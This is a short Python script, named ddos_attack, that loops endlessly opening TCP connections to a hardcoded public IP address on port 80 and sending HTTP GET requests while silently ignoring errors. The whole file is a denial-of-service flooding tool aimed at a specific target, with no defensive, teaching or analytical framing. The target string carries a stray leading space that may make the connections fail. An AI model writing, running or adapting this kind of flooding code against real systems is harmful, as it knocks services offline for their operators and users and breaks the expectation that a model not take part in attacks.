import socket

target_ip = " 34.135.166.24"
target_port = 80

def ddos_attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.sendall(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")
            s.close()
        except:
            pass

ddos_attack()